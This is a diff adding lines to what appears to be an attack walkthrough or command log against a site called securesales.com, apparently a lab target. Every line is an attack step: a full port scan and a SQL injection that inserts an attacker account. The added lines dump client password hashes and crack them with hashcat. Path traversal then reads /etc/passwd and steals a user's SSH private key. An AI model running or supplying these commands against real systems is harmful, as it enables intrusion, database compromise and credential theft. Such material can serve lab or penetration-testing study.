@@ -3,6 +3,9 @@ nmap -Pn -p- --min-rate 10000 securesales.com
 curl -X POST 'http://securesales.com/newsletter.php' --data-raw 'email=attacker%40evil.com%27%2C+true%29%3B+INSERT+INTO+users+%28username%2C+email%2C+password%29+VALUES+%28%27attacker%27%2C+%27
 attacker%40evil.com%27%2C+%27hacked%27%29%3B+--+-' --insecure
 mariadb -u attacker --password=hacked -D securesales -h securesales.com
+mariadb -u attacker --password=hacked -D securesales -h securesales.com -e "SELECT company_name, hash FROM clients;" -B -N | awk '{print $1 ":" $2}' > hashes
+hashcat -m 0 hashes seasons.txt --username
+hashcat -m 0 hashes seasons.txt --username --show
 curl http://securesales.com/page.php?file=../../../../etc/passwd
 curl http://securesales.com/page.php?file=../../../../home/alicia/.ssh/id_rsa
 curl http://securesales.com/page.php?file=../../../../home/alicia/.ssh/id_rsa > alicia.key
